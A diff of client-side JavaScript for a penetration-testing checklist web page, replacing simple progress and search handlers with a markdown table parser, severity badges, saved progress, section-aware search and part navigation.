-    var done=rows.filter(function(r){return r.classList.contains('done');}).length;
-    document.getElementById('pct').textContent=done+' / '+rows.length;
-    document.getElementById('pfill').style.width=(rows.length?done/rows.length*100:0)+'%';
+'use strict';
+/* ───────── helpers ───────── */
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function inline(s){
+  s=esc(s);
+  s=s.replace(/``([^`][\s\S]*?)``|`([^`\n]+)`/g,function(m,d,t){return '<code>'+(d!==undefined?d:t)+'</code>';});
+  return s.replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>');
+}
+function normText(s){return (s||'').toLowerCase().replace(/&/g,' and ').replace(/[^a-z0-9]+/g,' ').trim();}
+function splitRow(line){
+  var s=line.replace(/^\s*\|/,'').replace(/\|\s*$/,''),cells=[],cur='',i=0;
+  while(i<s.length){
+    if(s[i]==='\\'&&s[i+1]==='|'){cur+='|';i+=2;}
+    else if(s[i]==='|'){cells.push(cur.trim());cur='';i++;}
+    else{cur+=s[i];i++;}
   }
+  cells.push(cur.trim());return cells;
+}
+function sevClass(t){t=t.toLowerCase();if(t.indexOf('critical')>-1)return'critical';if(t.indexOf('high')>-1)return'high';if(t.indexOf('medium')>-1)return'medium';if(t.indexOf('low')>-1)return'low';return'info';}
 
-  main.addEventListener('click',function(e){
-    var td=e.target.closest('td.status');if(!td)return;
-    var tr=td.closest('tr');tr.classList.toggle('done');
-    var cb=td.querySelector('.cb');cb.setAttribute('aria-checked',tr.classList.contains('done'));
-    var id=tr.dataset.rowId;
-    if(tr.classList.contains('done'))store[id]=1;else delete store[id];
-    try{localStorage.setItem(KEY,JSON.stringify(store));}catch(err){}
-    updateProgress();
-  });
-  main.addEventListener('keydown',function(e){
-    if((e.key===' '||e.key==='Enter')&&e.target.classList&&e.target.classList.contains('cb')){
-      e.preventDefault();e.target.click();
-    }
-  });
+/* ───────── parse markdown source ───────── */
+var MD=document.getElementById('src').textContent.replace(/<\\\//g,'</');
+var doc=document.getElementById('doc');
+var parts=[],allRows=[],curPart=null,curSec=null,pending=null;
 
-  // search filter
-  var search=document.getElementById('q'),empty=document.getElementById('no-results');
-  search.addEventListener('input',function(){
-    var v=search.value.trim().toLowerCase(),any=false;
-    main.querySelectorAll('.sec').forEach(function(sec){
-      var n=0;
-      sec.querySelectorAll('tbody tr').forEach(function(tr){
-        var hit=!v||tr.textContent.toLowerCase().indexOf(v)>-1;
-        tr.style.display=hit?'':'none';if(hit)n++;
-      });
-      var show=!v||n>0;sec.style.display=show?'':'none';if(n>0)any=true;
+function flushTable(){if(pending&&curSec)buildTable(pending,curSec);pending=null;}
+
+function addPart(t){
+  var m=t.match(/^PART\s+(\d+)\s*[:—–-]\s*(.+)$/i),num=m?m[1]:'0',rest=m?m[2]:t,sub='';
+  var pm=rest.match(/\(([^)]+)\)\s*$/);
+  if(pm){sub=pm[1];rest=rest.slice(0,pm.index).trim();}
+  else{var ix=rest.indexOf('—');if(ix>-1){sub=rest.slice(ix+1).trim();rest=rest.slice(0,ix).trim();}}
+  var title=rest.toLowerCase().replace(/\b\w/g,function(c){return c.toUpperCase();});
+  var el=document.createElement('section');
+  el.className='part';el.id='part-'+num;
+  el.innerHTML='<header class="part-head"><span class="part-badge">PART '+esc(num)+'</span><h1>'+esc(title)+'</h1>'
+    +(sub?'<span class="part-sub">'+esc(sub)+'</span>':'')+'<span class="part-progress"></span></header>';
+  doc.appendChild(el);
+  curPart={el:el,num:num,title:title,norm:normText('part '+num+' '+title+' '+sub),sections:[],doneEl:el.querySelector('.part-progress'),navBtn:null};
+  parts.push(curPart);curSec=null;
+}
+function addSection(t){
+  var m=t.match(/^(\d+(?:\.\d+)*)\s*[—–-]\s*(.+)$/),num=m?m[1]:'',title=m?m[2]:t;
+  var el=document.createElement('section');el.className='sec';
+  var h2=document.createElement('h2');
+  h2.innerHTML=(num?'<span class="sec-num">'+esc(num)+'</span><span class="sep"> — </span>':'')+esc(title)+' <span class="pill pill-muted" hidden></span>';
+  el.appendChild(h2);
+  (curPart?curPart.el:doc).appendChild(el);
+  curSec={el:el,num:num,title:title,norm:normText(num+' '+title),rows:[],pill:h2.querySelector('.pill')};
+  if(curPart)curPart.sections.push(curSec);
+}
+function buildTable(lines,sec){
+  var parsed=lines.map(splitRow).filter(function(c){return !c.every(function(x){return /^:?-+:?$/.test(x);});});
+  if(parsed.length<2)return;
+  var headers=parsed[0],body=parsed.slice(1),sevIdx=-1,statIdx=-1;
+  headers.forEach(function(h,i){var t=h.toLowerCase();if(t==='severity')sevIdx=i;if(t==='status')statIdx=i;});
+  var table=document.createElement('table');
+  var widths=headers.length===5?['64px','22%','118px',null,'76px']:headers.length===4?['64px','26%',null,'76px']:null;
+  if(widths){var cg=document.createElement('colgroup');headers.forEach(function(h,i){var c=document.createElement('col');if(widths[i])c.style.width=widths[i];cg.appendChild(c);});table.appendChild(cg);}
+  var thead=document.createElement('thead'),hr=document.createElement('tr');
+  headers.forEach(function(h,i){var th=document.createElement('th');th.innerHTML=inline(h);if(i===statIdx)th.classList.add('status');hr.appendChild(th);});
+  thead.appendChild(hr);table.appendChild(thead);
+  var tbody=document.createElement('tbody');
+  body.forEach(function(cells){
+    while(cells.length<headers.length)cells.push('');
+    if(cells.length>headers.length)cells=cells.slice(0,headers.length-1).concat([cells.slice(headers.length-1).join(' | ')]);
+    var tr=document.createElement('tr');
+    cells.forEach(function(c,i){
+      var td=document.createElement('td');
+      if(i===statIdx){td.classList.add('status');td.innerHTML='<span class="cb" role="checkbox" tabindex="0" aria-label="toggle"></span>';}
+      else if(i===sevIdx&&c){td.innerHTML='<span class="badge badge-'+sevClass(c)+'">'+inline(c)+'</span>';}
+      else{td.innerHTML=inline(c);}
+      tr.appendChild(td);
     });
-    empty.style.display=(!v||any)?'none':'block';
+    var id=(cells[0]||'').trim();
+    tr.dataset.rowId=id;
+    tbody.appendChild(tr);
+    var rec={tr:tr,id:id,sec:sec,part:curPart};
+    rec.norm=normText(tr.textContent);
+    sec.rows.push(rec);allRows.push(rec);
   });
-  document.addEventListener('keydown',function(e){
-    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
-    if(e.key==='/'&&!typing){e.preventDefault();search.focus();search.select();}
-    if(e.key==='Escape'&&document.activeElement===search){search.value='';search.dispatchEvent(new Event('input'));search.blur();}
-  });
+  table.appendChild(tbody);
+  var wrap=document.createElement('div');wrap.className='table-wrap';wrap.appendChild(table);
+  sec.el.appendChild(wrap);
+  sec.pill.hidden=false;sec.pill.textContent=sec.rows.length;sec.pill.className='pill pill-muted';sec.pill.title=sec.rows.length+' checks';
+}
 
-  document.getElementById('reset').addEventListener('click',function(){
-    if(!confirm('Reset all checkmarks?'))return;
-    store={};try{localStorage.removeItem(KEY);}catch(e){}
-    rows.forEach(function(r){r.classList.remove('done');});
-    updateProgress();
-  });
+MD.split('\n').forEach(function(line){
+  line=line.trim();
+  if(!line){flushTable();return;}
+  if(line.charAt(0)==='|'){pending=pending||[];pending.push(line);return;}
+  flushTable();
+  if(/^#\s+/.test(line))addPart(line.replace(/^#\s+/,''));
+  else if(/^##\s+/.test(line))addSection(line.replace(/^##\s+/,''));
+});
+flushTable();
 
+/* ───────── progress (localStorage) ───────── */
+var KEY='vapt-checklist-progress',store={};
+try{store=JSON.parse(localStorage.getItem(KEY)||'{}')||{};}catch(e){}
+allRows.forEach(function(r){if(store[r.id])r.tr.classList.add('done');});
+var pct=document.getElementById('pct'),pfill=document.getElementById('pfill');
+function updateProgress(){
+  var done=0;
+  parts.forEach(function(p){
+    var d=0,n=0;
+    p.sections.forEach(function(s){s.rows.forEach(function(r){n++;if(r.tr.classList.contains('done'))d++;});});
+    p.doneEl.textContent=d+' / '+n;
+    p.doneEl.classList.toggle('complete',n>0&&d===n);
+    done+=d;
+  });
+  pct.textContent=done+' / '+allRows.length;
+  pfill.style.width=(allRows.length?100*done/allRows.length:0)+'%';
+}
+doc.addEventListener('click',function(e){
+  var td=e.target.closest('td.status');if(!td)return;
+  var tr=td.closest('tr');tr.classList.toggle('done');
+  var id=tr.dataset.rowId;
+  if(tr.classList.contains('done'))store[id]=1;else delete store[id];
+  try{localStorage.setItem(KEY,JSON.stringify(store));}catch(err){}
   updateProgress();
+});
+doc.addEventListener('keydown',function(e){
+  if((e.key===' '||e.key==='Enter')&&e.target.classList&&e.target.classList.contains('cb')){
+    e.preventDefault();
+    e.target.parentElement.dispatchEvent(new MouseEvent('click',{bubbles:true}));
+  }
+});
+
+/* ───────── section-aware search ─────────
+   • query matches a PART or SECTION title (or is a section number like 1.2)
+     → that section shows ALL its rows ("expanded in full")
+   • otherwise → row-by-row filtering                       */
+var qEl=document.getElementById('q'),fb=document.getElementById('filterbar'),noRes=document.getElementById('no-results');
+function titleMatch(q,t){
+  if(!q)return false;
+  if(t.indexOf(q)>-1)return true;
+  var w=q.split(' ').filter(Boolean);
+  return w.length>1&&w.every(function(x){return t.indexOf(x)>-1;});
+}
+function applyFilter(){
+  var raw=qEl.value.trim(),q=normText(raw);
+  var numExact=/^\d{1,2}(\.\d{1,2})?$/.test(raw)?raw:null;
+  var totalVis=0,fullSecs=0,rowSecs=0;
+  parts.forEach(function(p){
+    var partFull=numExact?p.num===numExact:!!q&&titleMatch(q,p.norm);
+    var pvis=0;
+    p.sections.forEach(function(s){
+      var full=partFull||(numExact?s.num===numExact:!!q&&titleMatch(q,s.norm));
+      var vis=0;
+      s.rows.forEach(function(r){
+        var hit=(!q&&!numExact)?true:(numExact?full:(full||r.norm.indexOf(q)>-1));
+        r.tr.classList.toggle('hide',!hit);
+        if(hit)vis++;
+      });
+      var show=vis>0;
+      s.el.classList.toggle('hide',!show);
+      if(q||numExact){
+        if(show){
+          if(full){s.pill.className='pill pill-full';s.pill.textContent='all '+s.rows.length;fullSecs++;}
+          else{s.pill.className='pill pill-rows';s.pill.textContent=vis+' / '+s.rows.length;rowSecs++;}
+        }
+      }else{s.pill.className='pill pill-muted';s.pill.textContent=s.rows.length;}
+      pvis+=show?vis:0;
+    });
+    p.el.classList.toggle('hide',pvis===0);
+    if(p.navBtn)p.navBtn.classList.toggle('dim',pvis===0);
+    totalVis+=pvis;
+  });
+  if(!q&&!numExact){fb.hidden=true;noRes.hidden=true;return;}
+  fb.hidden=false;
+  document.getElementById('fb-query').textContent=raw;
+  var bits=[];
+  if(fullSecs)bits.push(fullSecs+(fullSecs>1?' sections':' section')+' expanded in full');
+  if(rowSecs)bits.push(rowSecs+(rowSecs>1?' sections':' section')+' with matching rows');
+  document.getElementById('fb-info').textContent=totalVis?totalVis+(totalVis===1?' check':' checks')+' — '+bits.join(' · '):'no matches';
+  document.getElementById('nr-q').textContent=raw;
+  noRes.hidden=totalVis>0;
+}
+qEl.addEventListener('input',applyFilter);
+qEl.addEventListener('keydown',function(e){
+  if(e.key==='Enter'){e.preventDefault();var t=document.querySelector('.part:not(.hide) > .sec:not(.hide)');if(t)t.scrollIntoView({behavior:'smooth',block:'start'});}
+  if(e.key==='Escape'){qEl.value='';applyFilter();qEl.blur();}
+});
+document.addEventListener('keydown',function(e){
+  var a=document.activeElement,typing=a&&(a.tagName==='INPUT'||a.tagName==='TEXTAREA');
+  if(e.key==='/'&&!typing){e.preventDefault();qEl.focus();qEl.select();}
+});
+document.getElementById('fb-clear').addEventListener('click',function(){qEl.value='';applyFilter();qEl.focus();});
+document.getElementById('reset').addEventListener('click',function(){
+  if(!confirm('Reset all checkmarks?'))return;
+  store={};try{localStorage.removeItem(KEY);}catch(e){}
+  allRows.forEach(function(r){r.tr.classList.remove('done');});
+  updateProgress();
+});
+
+/* ───────── part quick-nav ───────── */
+var nav=document.getElementById('parts-nav');
+parts.forEach(function(p){
+  var b=document.createElement('button');
+  b.className='pnav';b.type='button';b.textContent='P'+p.num;b.title='Go to '+p.title+(p.sub?' — '+p.sub:'');
+  b.addEventListener('click',function(){
+    if(qEl.value){qEl.value='';applyFilter();}
+    p.el.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+  nav.appendChild(b);p.navBtn=b;
+});
+
+document.getElementById('hero-tag').textContent=parts.length+' parts · '+allRows.length+' checks';
+updateProgress();
 })();
 </script>
 </body>
